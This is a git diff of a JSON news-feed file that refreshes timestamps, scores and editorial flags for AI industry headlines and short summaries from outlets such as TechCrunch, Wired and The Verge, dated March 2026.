@@ -1,6 +1,118 @@
 {
-  "updatedAt": "2026-03-19T16:05:38.971914+00:00",
+  "updatedAt": "2026-03-19T18:00:01.742993+00:00",
   "items": [
+    {
+      "title": "AI analytics agents need guardrails, not more model size",
+      "url": "https://thenextweb.com/news/ai-analytics-agents-need-guardrails-not-more-model-size",
+      "source": "The Next Web",
+      "sourceUrl": "https://thenextweb.com/feed",
+      "sourceWeight": 0.75,
+      "category": "AI",
+      "summary": "Picture a VP of finance at a large retailer. She asks the company’s new AI analytics agent a simple question: “What was our revenue last quarter?” The answer comes back in seconds. Confident. Clean. Wrong. That exact scenario happens more frequently than many organizations would care to admit. AtScale, which enables organizations to deploy governed [&hellip;]\nThis story continues at The Next Web",
+      "image": "https://cdn0.tnwcdn.com/wp-content/blogs.dir/1/files/2026/03/growtika-nGoCBxiaRO0-unsplash.jpg",
+      "published": "2026-03-19T17:33:09+00:00",
+      "firstSeen": "2026-03-19T18:00:01.742993+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
+      "editorial_allow": true,
+      "editorial_reason": "high_score_override",
+      "score": 5.9364
+    },
+    {
+      "title": "Meta rolls out new AI content enforcement systems while reducing reliance on third-party vendors",
+      "url": "https://techcrunch.com/2026/03/19/meta-rolls-out-new-ai-content-enforcement-systems-while-reducing-reliance-on-third-party-vendors",
+      "source": "TechCrunch AI",
+      "sourceUrl": "https://techcrunch.com/category/artificial-intelligence/feed/",
+      "sourceWeight": 0.85,
+      "category": "AI",
+      "summary": "Meta believes these AI systems can detect more violations with greater accuracy, better prevent scams, respond more quickly to real-world events, and reduce over-enforcement.",
+      "image": "https://techcrunch.com/wp-content/uploads/2025/07/GettyImages-2194278734.jpg?w=1024",
+      "published": "2026-03-19T17:24:13+00:00",
+      "firstSeen": "2026-03-19T18:00:01.742993+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
+      "editorial_allow": false,
+      "editorial_reason": "low_editorial_priority",
+      "score": 2.2719
+    },
+    {
+      "title": "Nvidia’s Open Model Super Panel Made a Strong Case for Open Agents",
+      "url": "https://www.techrepublic.com/article/news-nvidia-gtc-2026-open-models-open-agents-shift",
+      "source": "TechRepublic AI",
+      "sourceUrl": "https://www.techrepublic.com/rssfeeds/topic/artificial-intelligence/",
+      "sourceWeight": 0.75,
+      "category": "AI",
+      "summary": "At GTC 2026, Jensen Huang, Aravind Srinivas, Harrison Chase, Mira Murati, and Michael Truell made a compelling case that the future of AI belongs to open agent systems, not just open models.\nThe post Nvidia’s Open Model Super Panel Made a Strong Case for Open Agents appeared first on TechRepublic.",
+      "image": "https://assets.techrepublic.com/uploads/2026/03/unnamed-14.jpg",
+      "published": "2026-03-19T17:13:05+00:00",
+      "firstSeen": "2026-03-19T18:00:01.742993+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
+      "editorial_allow": true,
+      "editorial_reason": "high_score_override",
+      "score": 5.9264
+    },
+    {
+      "title": "AT&T Launches AI-Powered App for Millions of Customers",
+      "url": "https://www.techrepublic.com/article/news-att-launches-ai-powered-app",
+      "source": "TechRepublic AI",
+      "sourceUrl": "https://www.techrepublic.com/rssfeeds/topic/artificial-intelligence/",
+      "sourceWeight": 0.75,
+      "category": "AI",
+      "summary": "AT&#038;T’s new app pushes AI deeper into billing, support, and device management.\nThe post AT&#038;T Launches AI-Powered App for Millions of Customers appeared first on TechRepublic.",
+      "image": "https://assets.techrepublic.com/uploads/2025/12/Woman-on-Phone-1-Adobe.jpeg",
+      "published": "2026-03-19T16:52:39+00:00",
+      "firstSeen": "2026-03-19T18:00:01.742993+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
+      "editorial_allow": false,
+      "editorial_reason": "did_not_clear_gate",
+      "score": 5.0162
+    },
+    {
+      "title": "Thoughts on OpenAI acquiring Astral and uv/ruff/ty",
+      "url": "https://simonwillison.net/2026/Mar/19/openai-acquiring-astral",
+      "source": "Simon Willison",
+      "sourceUrl": "https://simonwillison.net/atom/everything/",
+      "sourceWeight": 0.85,
+      "category": "AI",
+      "summary": "The big news this morning: Astral to join OpenAI (on the Astral blog) and OpenAI to acquire Astral (the OpenAI announcement). Astral are the company behind uv, ruff, and ty - three increasingly load-bearing open source projects in the Python ecosystem. I have thoughts!\nThe official line from OpenAI and Astral\nThe Astral team will become part of the Codex team at OpenAI.\nCharlie Marsh has this to say:\n\nOpen source is at the heart of that impact and the heart of that story; it sits at the center of everything we do. In line with our philosophy and OpenAI's own announcement, OpenAI will continue ",
+      "image": "https://imgs.xkcd.com/comics/python_environment.png",
+      "published": "2026-03-19T16:45:15+00:00",
+      "firstSeen": "2026-03-19T18:00:01.742993+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
+      "editorial_allow": true,
+      "editorial_reason": "high_score_override",
+      "score": 5.9526
+    },
+    {
+      "title": "DoorDash launches a new ‘Tasks’ app that pays couriers to submit videos to train AI",
+      "url": "https://techcrunch.com/2026/03/19/doordash-launches-a-new-tasks-app-that-pays-couriers-to-submit-videos-to-train-ai",
+      "source": "TechCrunch AI",
+      "sourceUrl": "https://techcrunch.com/category/artificial-intelligence/feed/",
+      "sourceWeight": 0.85,
+      "category": "AI",
+      "summary": "Delivery couriers will be able to earn money by completing activities like filming everyday tasks or recording themselves speaking in another language.",
+      "image": "https://techcrunch.com/wp-content/uploads/2022/08/GettyImages-1232015093.jpg?resize=1200%2C800",
+      "published": "2026-03-19T16:14:00+00:00",
+      "firstSeen": "2026-03-19T18:00:01.742993+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
+      "editorial_allow": false,
+      "editorial_reason": "did_not_clear_gate",
+      "score": 5.1373
+    },
+    {
+      "title": "ChatGPT’s ‘Adult Mode’ Could Spark a New Era of Intimate Surveillance",
+      "url": "https://www.wired.com/story/chatgpt-adult-mode-new-era-of-intimate-surveillance",
+      "source": "Wired AI",
+      "sourceUrl": "https://www.wired.com/feed/tag/ai/latest/rss",
+      "sourceWeight": 0.85,
+      "category": "AI",
+      "summary": "OpenAI plans to allow sexting with ChatGPT. A human-AI interaction expert warns of a privacy nightmare.",
+      "image": "https://media.wired.com/photos/69bc088492c0fea2c0434768/master/pass/GettyImages-2220923493.jpg",
+      "published": "2026-03-19T16:06:49+00:00",
+      "firstSeen": "2026-03-19T18:00:01.742993+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
+      "editorial_allow": true,
+      "editorial_reason": "major_product_news",
+      "score": 7.6338
+    },
     {
       "title": "The Hidden Problem With ‘Vibe Coding’ Apps on Apple’s App Store",
       "url": "https://www.techrepublic.com/article/news-apple-vibe-coding-app-store-rules",
@@ -12,10 +124,10 @@
       "image": "",
       "published": "2026-03-19T15:40:02+00:00",
       "firstSeen": "2026-03-19T16:05:38.971914+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": true,
       "editorial_reason": "high_score_override",
-      "score": 5.637
+      "score": 5.581
     },
     {
       "title": "TechCrunch Startup Battlefield 200 nominations are still open",
@@ -28,10 +140,10 @@
       "image": "https://techcrunch.com/wp-content/uploads/2025/11/54889393608_2493644601_o-2.jpg?resize=1200%2C800",
       "published": "2026-03-19T15:00:00+00:00",
       "firstSeen": "2026-03-19T15:03:55.074819+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": false,
       "editorial_reason": "low_editorial_priority",
-      "score": 2.2571
+      "score": 2.202
     },
     {
       "title": "Your inbox is someone else&#8217;s business model. It doesn&#8217;t have to be",
@@ -44,10 +156,10 @@
       "image": "https://cdn0.tnwcdn.com/wp-content/blogs.dir/1/files/2026/03/Fastmail-Deal-TNW.png",
       "published": "2026-03-19T14:28:36+00:00",
       "firstSeen": "2026-03-19T15:00:01.449763+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": false,
       "editorial_reason": "low_editorial_priority",
-      "score": 2.1017
+      "score": 2.0474
     },
     {
       "title": "Signal’s Creator Is Helping Encrypt Meta AI",
@@ -60,10 +172,10 @@
       "image": "https://media.wired.com/photos/69baacb648cfa1aefb918759/master/pass/GettyImages-2263125077.jpg",
       "published": "2026-03-19T14:09:51+00:00",
       "firstSeen": "2026-03-19T15:00:01.449763+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": false,
       "editorial_reason": "did_not_clear_gate",
-      "score": 5.2326
+      "score": 5.1788
     },
     {
       "title": "**Introducing SPEED-Bench: A Unified and Diverse Benchmark for Speculative Decoding**",
@@ -76,10 +188,10 @@
       "image": "https://cdn-uploads.huggingface.co/production/uploads/668e7a379ab7631fcd434ee7/XacU6olgSSgQvlkrw0gMo.png",
       "published": "2026-03-19T14:04:54+00:00",
       "firstSeen": "2026-03-19T15:00:01.449763+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": false,
       "editorial_reason": "did_not_clear_gate",
-      "score": 5.1202
+      "score": 5.0665
     },
     {
       "title": "Austrian startup TACEO launches a network that runs sensitive computation without seeing the underlying data",
@@ -92,10 +204,10 @@
       "image": "https://cdn0.tnwcdn.com/wp-content/blogs.dir/1/files/2026/03/TACEO-launches-its-private-execution-network.png",
       "published": "2026-03-19T14:00:25+00:00",
       "firstSeen": "2026-03-19T15:00:01.449763+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": false,
       "editorial_reason": "did_not_clear_gate",
-      "score": 4.988
+      "score": 4.9345
     },
     {
       "title": "Xiaomi Unmasks Mystery AI Model Behind DeepSeek Buzz",
@@ -108,10 +220,10 @@
       "image": "https://assets.techrepublic.com/uploads/2026/03/tr-03192026-xiaomi-hunter-alpha-ai-model.jpg",
       "published": "2026-03-19T13:13:49+00:00",
       "firstSeen": "2026-03-19T15:00:01.449763+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": false,
       "editorial_reason": "framework_or_plumbing",
-      "score": 5.4659
+      "score": 5.4135
     },
     {
       "title": "Smooth Moves: 90 Frames-Per-Second Virtual Reality Arrives on GeForce NOW",
@@ -124,10 +236,10 @@
       "image": "https://blogs.nvidia.com/wp-content/uploads/2026/03/gfn-thursday-3-19-nv-blog-1280x680-logo.jpg",
       "published": "2026-03-19T13:00:09+00:00",
       "firstSeen": "2026-03-19T13:40:31.671179+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": false,
       "editorial_reason": "low_editorial_priority",
-      "score": 2.8995
+      "score": 2.8474
     },
     {
       "title": "Adobe’s AI image generator can now be trained on your own art",
@@ -140,10 +252,10 @@
       "image": "https://platform.theverge.com/wp-content/uploads/sites/2/2026/03/Firefly-Custom-Models-Hero-Image.jpg?quality=90&amp%3Bstrip=all&amp%3Bcrop=0%2C5.1234106207928%2C100%2C89.753178758414&amp%3Bw=1200",
       "published": "2026-03-19T13:00:00+00:00",
       "firstSeen": "2026-03-19T13:40:31.671179+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": true,
       "editorial_reason": "high_score_override",
-      "score": 6.4694
+      "score": 6.4173
     },
     {
       "title": "Put the power of AI directly in your browser with BrowserCoPilot",
@@ -156,10 +268,10 @@
       "image": "https://assets.techrepublic.com/uploads/2026/02/Copy-of-Untitled-Design-40.png",
       "published": "2026-03-19T12:30:34+00:00",
       "firstSeen": "2026-03-19T13:00:01.664933+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": true,
       "editorial_reason": "editorial_score_pass",
-      "score": 8.5457
+      "score": 8.4944
     },
     {
       "title": "Amazon brings Alexa+ to the UK",
@@ -172,10 +284,10 @@
       "image": "https://techcrunch.com/wp-content/uploads/2026/03/Alexa-UK.jpeg?resize=1200%2C675",
       "published": "2026-03-19T12:27:24+00:00",
       "firstSeen": "2026-03-19T13:00:01.664933+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": true,
       "editorial_reason": "high_score_override",
-      "score": 8.1843
+      "score": 8.133
     },
     {
       "title": "Fitbit&#8217;s AI health coach will soon be able to read your medical records",
@@ -188,10 +300,10 @@
       "image": "https://platform.theverge.com/wp-content/uploads/sites/2/2026/03/Fitbit_STK151_01.jpg?quality=90&amp%3Bstrip=all&amp%3Bcrop=0%2C10.732984293194%2C100%2C78.534031413613&amp%3Bw=1200",
       "published": "2026-03-19T12:27:23+00:00",
       "firstSeen": "2026-03-19T13:00:01.664933+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": false,
       "editorial_reason": "did_not_clear_gate",
-      "score": 4.2543
+      "score": 4.203
     },
     {
       "title": "Uber and Rivian strike $1.25bn robotaxi deal",
@@ -204,10 +316,26 @@
       "image": "https://cdn0.tnwcdn.com/wp-content/blogs.dir/1/files/2026/03/Uber-and-Rivian-strike-1.25bn-robotaxi-deal.png",
       "published": "2026-03-19T12:25:13+00:00",
       "firstSeen": "2026-03-19T13:00:01.664933+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": false,
       "editorial_reason": "low_editorial_priority",
-      "score": 2.0433
+      "score": 1.9921
+    },
+    {
+      "title": "How we monitor internal coding agents for misalignment",
+      "url": "https://openai.com/index/how-we-monitor-internal-coding-agents-misalignment",
+      "source": "OpenAI News",
+      "sourceUrl": "https://openai.com/news/rss.xml",
+      "sourceWeight": 1.0,
+      "category": "AI",
+      "summary": "How OpenAI uses chain-of-thought monitoring to study misalignment in internal coding agents—analyzing real-world deployments to detect risks and strengthen AI safety safeguards.",
+      "image": "https://images.ctfassets.net/kftzwdyauwt9/6QiOsDAtMDSQDtyJdqygZ3/e00d303b22fcbefb76ebb13ed003f6b9/OAI_Monitoring_internal_deployments_for_loss_of_control_risks_SEO_16x9.png?w=1600&amp%3Bh=900&amp%3Bfit=fill",
+      "published": "2026-03-19T10:00:00+00:00",
+      "firstSeen": "2026-03-19T18:00:01.742993+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
+      "editorial_allow": true,
+      "editorial_reason": "editorial_score_pass",
+      "score": 9.3808
     },
     {
       "title": "The Fight to Hold AI Companies Accountable for Children’s Deaths",
@@ -217,13 +345,13 @@
       "sourceWeight": 0.85,
       "category": "AI",
       "summary": "After a series of suicides allegedly linked to AI chatbots, one lawyer is trying to hold companies like OpenAI accountable.",
-      "image": "https://media.wired.com/photos/699503a3222c28198015e17e/master/pass/LMG-FOR-WIRED-Business-FINAL-SELECTS-7.jpg",
+      "image": "https://media.wired.com/photos/69bc2b5dec2e92eafec7b778/master/pass/LMG-FOR-WIRED-Business-FINAL-SELECTS-5.jpg",
       "published": "2026-03-19T10:00:00+00:00",
       "firstSeen": "2026-03-19T10:59:35.101177+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": false,
       "editorial_reason": "did_not_clear_gate",
-      "score": 4.1187
+      "score": 4.0708
     },
     {
       "title": "Alpine Eagle is scaling counter-drone production as Europe races to close its air-defence gap",
@@ -236,10 +364,10 @@
       "image": "https://cdn0.tnwcdn.com/wp-content/blogs.dir/1/files/2026/03/Alpine-Eagle-is-scaling-counter-drone-production.png",
       "published": "2026-03-19T09:58:26+00:00",
       "firstSeen": "2026-03-19T10:59:35.101177+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": false,
       "editorial_reason": "low_editorial_priority",
-      "score": 2.678
+      "score": 2.6302
     },
     {
       "title": "eternal.ag raises €8M to put autonomous harvesting robots into greenhouses",
@@ -252,10 +380,10 @@
       "image": "https://cdn0.tnwcdn.com/wp-content/blogs.dir/1/files/2026/03/Eternal.ag-raises-E8M.png",
       "published": "2026-03-19T09:26:17+00:00",
       "firstSeen": "2026-03-19T09:59:04.108452+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": false,
       "editorial_reason": "low_editorial_priority",
-      "score": 3.0643
+      "score": 3.0172
     },
     {
       "title": "Parallel raises €20M to deploy AI agents for hospital administrative work across Europe",
@@ -268,10 +396,10 @@
       "image": "https://cdn0.tnwcdn.com/wp-content/blogs.dir/1/files/2026/03/Parallel-raises-E20M.png",
       "published": "2026-03-19T09:07:28+00:00",
       "firstSeen": "2026-03-19T09:59:04.108452+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": false,
       "editorial_reason": "did_not_clear_gate",
-      "score": 5.0064
+      "score": 4.9596
     },
     {
       "title": "7 Best AI Art Generators (2026): Top Tools for Stunning Digital Art",
@@ -284,10 +412,10 @@
       "image": "https://assets.techrepublic.com/uploads/2024/11/tr_20241105-best-ai-art-generators.jpg",
       "published": "2026-03-19T09:00:39+00:00",
       "firstSeen": "2026-03-19T13:00:01.664933+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": false,
       "editorial_reason": "low_editorial_priority",
-      "score": 3.0535
+      "score": 3.0069
     },
     {
       "title": "A Coding Guide to Implement Advanced Differential Equation Solvers, Stochastic Simulations, and Neural Ordinary Differential Equations Using Diffrax and JAX",
@@ -300,10 +428,10 @@
       "image": "https://www.marktechpost.com/wp-content/uploads/2026/03/blog-banner23-58-1024x731.png",
       "published": "2026-03-19T08:11:01+00:00",
       "firstSeen": "2026-03-19T08:59:37.199570+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": false,
       "editorial_reason": "framework_or_plumbing",
-      "score": 2.403
+      "score": 2.3575
     },
     {
       "title": "Multiverse Computing pushes its compressed AI models into the mainstream",
@@ -312,14 +440,14 @@
       "sourceUrl": "https://techcrunch.com/category/artificial-intelligence/feed/",
       "sourceWeight": 0.85,
       "category": "AI",
-      "summary": "After compressing models from major AI labs including OpenAI, Meta, DeepSeek and Mistral AI, Multiverse Computing has launched both an app that showcases the capabilities of its compressed models and an API that makes them more widely available.",
+      "summary": "After compressing models from major AI labs, including OpenAI, Meta, DeepSeek, and Mistral AI, Multiverse Computing has launched both an app that showcases the capabilities of its compressed models and an API that makes them more widely available.",
       "image": "https://techcrunch.com/wp-content/uploads/2026/03/GettyImages-2219202029.jpg?resize=1200%2C800",
       "published": "2026-03-19T08:00:00+00:00",
       "firstSeen": "2026-03-19T08:59:37.199570+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": true,
       "editorial_reason": "big_name_with_impact",
-      "score": 10.5685
+      "score": 10.5232
     },
     {
       "title": "Meet Mamba-3: A New State Space Model Frontier with 2x Smaller States and Enhanced MIMO Decoding Hardware Efficiency",
@@ -332,10 +460,26 @@
       "image": "https://www.marktechpost.com/wp-content/uploads/2026/03/blog-banner23-57-1024x731.png",
       "published": "2026-03-19T06:01:22+00:00",
       "firstSeen": "2026-03-19T07:00:02.000654+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": true,
       "editorial_reason": "editorial_score_pass",
-      "score": 8.5516
+      "score": 8.5087
+    },
+    {
+      "title": "Google Shakes Up Its Browser Agent Team Amid OpenClaw Craze",
+      "url": "https://www.wired.com/story/google-shakes-up-project-mariner-team-web-browsing-agents",
+      "source": "Wired AI",
+      "sourceUrl": "https://www.wired.com/feed/tag/ai/latest/rss",
+      "sourceWeight": 0.85,
+      "category": "AI",
+      "summary": "As Silicon Valley obsesses over a new wave of AI coding agents, Google and other AI labs are shifting their bets.",
+      "image": "https://media.wired.com/photos/69bc33bda714aba9de7defdf/master/pass/Model-Behavior-Google-Project-Mariner-Business.jpg",
+      "published": "2026-03-19T06:00:00+00:00",
+      "firstSeen": "2026-03-19T18:00:01.742993+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
+      "editorial_allow": true,
+      "editorial_reason": "editorial_score_pass",
+      "score": 8.4782
     },
     {
       "title": "Ringtime raises €1.8M to send AI agents after blue-collar candidates",
@@ -348,10 +492,10 @@
       "image": "https://cdn0.tnwcdn.com/wp-content/blogs.dir/1/files/2026/03/AI-startup-Ringtime-raises-E1.8M-for-voice-agents.png",
       "published": "2026-03-19T05:00:54+00:00",
       "firstSeen": "2026-03-19T06:00:01.695745+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": true,
       "editorial_reason": "high_score_override",
-      "score": 5.6586
+      "score": 5.6169
     },
     {
       "title": "Reson8 raises €5M pre-seed funding to scale Europe’s first customisable speech AI",
@@ -364,10 +508,10 @@
       "image": "https://cdn0.tnwcdn.com/wp-content/blogs.dir/1/files/2026/03/Reson8-raises-E5m-to-build-Europe-first-speech-AI.png",
       "published": "2026-03-19T05:00:43+00:00",
       "firstSeen": "2026-03-19T06:00:01.695745+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": false,
       "editorial_reason": "low_editorial_priority",
-      "score": 1.8585
+      "score": 1.8168
     },
     {
       "title": "OpenAI to acquire Astral",
@@ -380,10 +524,10 @@
       "image": "",
       "published": "2026-03-19T00:00:00+00:00",
       "firstSeen": "2026-03-19T13:40:31.671179+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": false,
       "editorial_reason": "did_not_clear_gate",
-      "score": 5.1035
+      "score": 5.0672
     },
     {
       "title": "Autoresearching Apple's \"LLM in a Flash\" to run Qwen 397B locally",
@@ -396,11 +540,11 @@
       "image": "",
       "published": "2026-03-18T23:56:46+00:00",
       "firstSeen": "2026-03-19T01:00:01.409388+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "model_release": true,
       "editorial_allow": true,
       "editorial_reason": "model_release",
-      "score": 15.0924
+      "score": 15.0562
     },
     {
       "title": "Meta is having trouble with rogue AI agents",
@@ -413,10 +557,10 @@
       "image": "https://techcrunch.com/wp-content/uploads/2024/02/GettyImages-1424498694.jpg?resize=1200%2C800",
       "published": "2026-03-18T23:42:46+00:00",
       "firstSeen": "2026-03-19T01:00:01.409388+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": false,
       "editorial_reason": "did_not_clear_gate",
-      "score": 4.5879
+      "score": 4.5519
     },
     {
       "title": "Sam Altman’s thank-you to coders draws the memes",
@@ -429,10 +573,10 @@
       "image": "https://techcrunch.com/wp-content/uploads/2025/09/GettyImages-2214107176.jpg?resize=1200%2C800",
       "published": "2026-03-18T23:12:58+00:00",
       "firstSeen": "2026-03-18T23:40:29.013224+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": false,
       "editorial_reason": "low_editorial_priority",
-      "score": 1.8783
+      "score": 1.8428
     },
     {
       "title": "Tsinghua and Ant Group Researchers Unveil a Five-Layer Lifecycle-Oriented Security Framework to Mitigate Autonomous LLM Agent Vulnerabilities in OpenClaw",
@@ -445,10 +589,10 @@
       "image": "https://www.marktechpost.com/wp-content/uploads/2026/03/image-22-150x150.png",
       "published": "2026-03-18T21:04:16+00:00",
       "firstSeen": "2026-03-18T21:48:11.312453+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": true,
       "editorial_reason": "high_score_override",
-      "score": 6.2685
+      "score": 6.235
     },
     {
       "title": "Nothing CEO Carl Pei says smartphone apps will disappear as AI agents take their place",
@@ -461,10 +605,10 @@
       "image": "https://techcrunch.com/wp-content/uploads/2025/09/Carl-Pei-Nothing.jpg?resize=1200%2C675",
       "published": "2026-03-18T20:30:52+00:00",
       "firstSeen": "2026-03-18T20:54:02.953935+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": true,
       "editorial_reason": "high_score_override",
-      "score": 5.6285
+      "score": 5.5956
     },
     {
       "title": "Nvidia is quietly building a multibillion-dollar behemoth to rival its chips business",
@@ -477,10 +621,10 @@
       "image": "https://techcrunch.com/wp-content/uploads/2024/12/GettyImages-2183848584.jpg?resize=1200%2C800",
       "published": "2026-03-18T20:01:19+00:00",
       "firstSeen": "2026-03-18T20:54:02.953935+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": false,
       "editorial_reason": "low_editorial_priority",
-      "score": 1.8199
+      "score": 1.7874
     },
     {
       "title": "David Sacks’ big Iran warning gets big time ignored",
@@ -493,154 +637,10 @@
       "image": "https://platform.theverge.com/wp-content/uploads/sites/2/2026/03/gettyimages-2203279318.jpg?quality=90&amp%3Bstrip=all&amp%3Bcrop=0%2C10.737892056687%2C100%2C78.524215886627&amp%3Bw=1200",
       "published": "2026-03-18T18:44:21+00:00",
       "firstSeen": "2026-03-18T19:00:01.764145+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
+      "lastSeen": "2026-03-19T18:00:01.742993+00:00",
       "editorial_allow": false,
       "editorial_reason": "low_editorial_priority",
-      "score": 1.8678
-    },
-    {
-      "title": "Baidu Qianfan Team Releases Qianfan-OCR: A 4B-Parameter Unified Document Intelligence Model",
-      "url": "https://www.marktechpost.com/2026/03/18/baidu-qianfan-team-releases-qianfan-ocr-a-4b-parameter-unified-document-intelligence-model",
-      "source": "MarkTechPost",
-      "sourceUrl": "https://www.marktechpost.com/feed/",
-      "sourceWeight": 0.8,
-      "category": "AI",
-      "summary": "The Baidu Qianfan Team introduced Qianfan-OCR, a 4B-parameter end-to-end model designed to unify document parsing, layout analysis, and document understanding within a single vision-language architecture. Unlike traditional multi-stage OCR pipelines that chain separate modules for layout detection and text recognition, Qianfan-OCR performs direct image-to-Markdown conversion and supports prompt-driven tasks like table extraction and document question [&#8230;]\nThe post Baidu Qianfan Team Releases Qianfan-OCR: A 4B-Parameter Unified Document Intelligence Model appeared first on MarkTechPost.",
-      "image": "https://www.marktechpost.com/wp-content/uploads/2026/03/Screenshot-2026-03-18-at-11.40.01-AM-1-150x150.png",
-      "published": "2026-03-18T18:41:33+00:00",
-      "firstSeen": "2026-03-18T19:00:01.764145+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
-      "editorial_allow": false,
-      "editorial_reason": "did_not_clear_gate",
-      "score": 4.927
-    },
-    {
-      "title": "ChatGPT did not cure a dog’s cancer",
-      "url": "https://www.theverge.com/ai-artificial-intelligence/896878/ai-did-not-cure-this-dogs-cancer",
-      "source": "The Verge AI",
-      "sourceUrl": "https://www.theverge.com/rss/ai-artificial-intelligence/index.xml",
-      "sourceWeight": 0.9,
-      "category": "AI",
-      "summary": "When an Australian tech entrepreneur with no background in biology or medicine said ChatGPT helped save his dog from cancer, the story spread with the kind of validation Big Tech has long craved: proof that AI will revolutionize medicine and take on one of its deadliest diseases. The reality, as usual, is more complicated. The [&#8230;]",
-      "image": "https://platform.theverge.com/wp-content/uploads/sites/2/2026/03/STK155_OPEN_AI_CVirginia__C.jpg?quality=90&amp%3Bstrip=all&amp%3Bcrop=0%2C10.732984293194%2C100%2C78.534031413613&amp%3Bw=1200",
-      "published": "2026-03-18T18:14:39+00:00",
-      "firstSeen": "2026-03-18T19:00:01.764145+00:00",
-      "lastSeen": "2026-03-19T16:05:38.971914+00:00",
-      "editorial_allow": false,
-      "editorial_reason": "did_not_clear_gate",
-      "score": 5.2595
-    },
-    {
-      "title": "Facebook will pay TikTok and YouTube creators up to $3,000 a month to post Reels on its platform",
-      "url": "https://thenextweb.com/news/facebook-creator-fast-track",
-      "source": "The Next Web",
-      "sourceUrl": "https://thenextweb.com/feed",
-      "sourceWeight": 0.75,
-      "category": "AI",
-      "summary": "Meta’s Creator Fast Track programme guarantees three months of pay for established creators willing to build a following on Facebook, after the company paid out a record $3 billion to creators in 2025. Facebook has a creator problem that three billion monthly users cannot solve. The platform is enormous, but the creators who drive the [&hellip;]\nThis story continues at The Next Web",
-      "image": "https://cdn0.tnwcdn.com/wp-content/blogs.dir/1/files/2026/03/Creator-Fast-Track.png",
